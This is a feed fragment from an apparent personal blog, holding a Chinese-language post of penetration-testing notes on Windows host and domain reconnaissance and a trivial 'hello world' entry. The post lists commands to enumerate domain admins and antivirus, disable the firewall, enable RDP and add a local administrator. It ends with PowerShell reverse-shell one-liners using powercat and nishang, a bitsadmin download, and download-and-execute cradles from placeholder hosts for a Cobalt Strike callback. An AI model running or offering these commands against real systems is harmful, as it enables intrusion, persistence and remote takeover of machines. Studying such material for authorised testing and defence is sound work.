    <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学</p><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><p>ipconfig /all</p><h3 id="查询本机的服务信息"><a href="#查询本机的服务信息" class="headerlink" title="查询本机的服务信息"></a>查询本机的服务信息</h3><p>wmic service list brief</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-2.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="查询系统信息"><a href="#查询系统信息" class="headerlink" title="查询系统信息"></a>查询系统信息</h3><p>systeminfo</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-3.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p>tasklist / wmic process list brief</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-4.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><p>schtasks /query /fo LIST /v 列出计划任务详细信息</p><h3 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h3><p>net statistics workstation</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-6.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h3><p>net user 查看所有用户<br>net localgroup administrators 获取本地管理员信息</p><h3 id="查看端口列表"><a href="#查看端口列表" class="headerlink" title="查看端口列表"></a>查看端口列表</h3><p>netstat -ano</p><h3 id="查看已打补丁"><a href="#查看已打补丁" class="headerlink" title="查看已打补丁"></a>查看已打补丁</h3><p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p><h3 id="查看共享列表"><a href="#查看共享列表" class="headerlink" title="查看共享列表"></a>查看共享列表</h3><p>net share 查看本机共享列表和可访问的域共享列表<br>wmic share get name,path,status 查找共享列表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-7.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="路由表和arp高速缓存表"><a href="#路由表和arp高速缓存表" class="headerlink" title="路由表和arp高速缓存表"></a>路由表和arp高速缓存表</h3><p>route print 路由表<br>arp -a arp高速缓存表</p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>netsh firewall set opmode disable 关闭防火墙(Windows Server 2003 以前的版本)</p><p>netsh advfirewall set allprofiles state off 关闭防火墙(Windows Server 2003 以后的版本)</p><p>netsh firewall show config 查看防火墙配置<br>如果上面的命令被弃用，则使用<br>netsh advfirewall firewall show rule name=all</p><p>根据参考，可以使用这个wmic一键获取本机信息<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="权限查看"><a href="#权限查看" class="headerlink" title="权限查看"></a>权限查看</h3><p>whoami /all 查看自己的详细权限<br>net user xxx /domain 查看域内指定用户的权限</p><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>.net time /domain 若出现以下情况则不存在域</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-20.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>若是报错：发生系统错误5，则存在域，但该用户不是域用户</p><p>若是以下情况则说明存在域且已经在域中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-21.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="查看域的名字"><a href="#查看域的名字" class="headerlink" title="查看域的名字"></a>查看域的名字</h3><p>net config workstation</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-22.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>nslookup -type=srv _ldap._tcp(力推）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-25.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>这个很爽，域控主机名和IP一块弄出来了</p><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>1.使用工具 nbtscan <a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-8.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>2.查看arp高速缓存表</p><p>arp -a</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-9-1613469427906.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>3.ICMP协议探测（逐个ping）</p><p>这个贼慢，但是不用下载其他应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="img/image-10-1613469427724.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>4.nmap直接开扫</p><p>5.meterpreter会话中执行 run windows/gather/enum_ad_computers</p><h3 id="扫描域内开放端口"><a href="#扫描域内开放端口" class="headerlink" title="扫描域内开放端口"></a>扫描域内开放端口</h3><p>1.nmap</p><p>nmap 192.168.1.0/24</p><p>2.工具 S扫描器</p><p>3.自写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#python3 慢的一批</span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip,port):</span><br><span class="line">    server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        server.connect((ip,port))</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port))</span><br><span class="line">    finally:</span><br><span class="line">        server.close()</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; &#39;172.16.0.198&#39;</span><br><span class="line">    for port in range(20,100):</span><br><span class="line">        get_ip_status(host,port)</span><br></pre></td></tr></table></figure><h3 id="域内基本信息"><a href="#域内基本信息" class="headerlink" title="域内基本信息"></a>域内基本信息</h3><p>net group “domain computers” /domain 查询所有域成员计算机列表<br>net view /domain:HACHE 查询域内所有主机<br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br>nltest /DCLIST:hacke 查看域控制器机器名<br>Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名</p><h3 id="域用户信息收集"><a href="#域用户信息收集" class="headerlink" title="域用户信息收集"></a>域用户信息收集</h3><p>net user /domain 向域控制器查询域内用户列表<br>wmic useraccount get /all 获取域内用户详细信息<br>net localgroup administrators 查询本地管理员用户<br>net group “domain admins” /domain 查询域管理员用户<br>net group “Enterprise admins” /domain 查询管理员用户组</p><h3 id="本机wmic查杀软"><a href="#本机wmic查杀软" class="headerlink" title="本机wmic查杀软"></a>本机wmic查杀软</h3><p><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code><br>or</p><p>WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</p><h3 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h3><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><h3 id="用户增删改查"><a href="#用户增删改查" class="headerlink" title="用户增删改查"></a>用户增删改查</h3><p>net user username password /add 加用户</p><p>net localgroup administrators username /add 添加XX到管理员账户</p><h3 id="一些喜欢用的"><a href="#一些喜欢用的" class="headerlink" title="一些喜欢用的"></a>一些喜欢用的</h3><p>Windows 反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666</span><br></pre></td></tr></table></figure><p>wmic 查杀软</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WMIC &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line"></span><br><span class="line">WMIC &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List</span><br></pre></td></tr></table></figure><p>开3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0</span><br></pre></td></tr></table></figure><p>常见杀软进程名<br><a href="https://blog.csdn.net/weixin_39997829/article/details/92666552">https://blog.csdn.net/weixin_39997829/article/details/92666552</a></p><p>cmd下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\users\sdyp\desktop\ff.jpg</span><br></pre></td></tr></table></figure><p>获取盘符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logicaldisk where drivetype&#x3D;3 get deviceid</span><br></pre></td></tr></table></figure><h3 id="ps-cs-上线"><a href="#ps-cs-上线" class="headerlink" title="ps cs 上线"></a>ps cs 上线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h1&gt;&lt;p&gt;前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学&lt;/p&gt;
&lt;h2 id=&quot;本机信息收集&quot;&gt;&lt;a href=&quot;#本机信息收集&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/02/16/world/"/>
    <id>http://example.com/2021/02/16/world/</id>
    <published>2021-02-16T15:54:06.172Z</published>
    <updated>2021-02-16T15:54:06.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p>gogogo</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;hello-world&quot;&gt;&lt;a href=&quot;#hello-world&quot; class=&quot;headerlink&quot; title=&quot;hello world&quot;&gt;&lt;/a&gt;hello world&lt;/h2&gt;&lt;p&gt;gogogo&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
